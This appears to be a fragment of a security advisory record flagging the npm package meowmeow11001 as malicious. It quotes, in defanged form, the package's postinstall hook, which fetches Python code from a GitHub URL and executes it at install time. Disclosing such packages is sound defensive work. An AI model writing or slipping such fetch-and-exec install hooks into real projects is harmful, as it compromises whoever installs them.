  "summary": "Malicious code in meowmeow11001 (npm)",
  "details": "A bare delivery vehicle (package.json only, ~306 bytes, no readme or license) whose postinstall hook runs python3 -c \"import urllib.request,os; exec(urllib.request.urlopen('hxxps://raw[.]githubusercontent[.]com/ganjanuss3521/meowww/refs/heads/main/meow[.]py').read())\" — fetching and executing arbitrary Python from a GitHub-hosted URL at install time. A classic lifecycle-downloader whose second-stage payload likely handles token theft or persistence.",
